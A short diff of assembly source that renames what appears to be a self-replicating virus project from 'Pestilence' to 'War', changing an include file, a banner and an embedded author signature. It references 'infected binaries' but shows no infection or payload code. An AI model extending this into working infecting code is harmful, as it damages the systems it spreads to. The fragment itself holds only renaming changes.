@@ -1,14 +1,4 @@
-;-------------------------------------------------------------------------------
-;|                 _____          _   _ _                                      |
-;|                |  __ \        | | (_) |                                     |
-;|                | |__) |__  ___| |_ _| | ___ _ __   ___ ___                  |
-;|                |  ___/ _ \/ __| __| | |/ _ \ '_ \ / __/ _ \                 |
-;|                | |  |  __/\__ \ |_| | |  __/ | | | (_|  __/                 |
-;|________________|_|   \___||___/\__|_|_|\___|_| |_|\___\___|_________________|
-;|                                                                             |
-;-------------------------------------------------------------------------------
-
-%include "pestilence.inc"
+%include "war.inc"
 
 section.text:
 	global _start
@@ -34,7 +24,7 @@ _params:; filled for infected binaries
 _start:
 	call _h3ll0w0rld; push addr to stack
 
-signature db `Pestilence version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
+signature db `War version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 
 _h3ll0w0rld:
 	pop r8; pop addr from stack
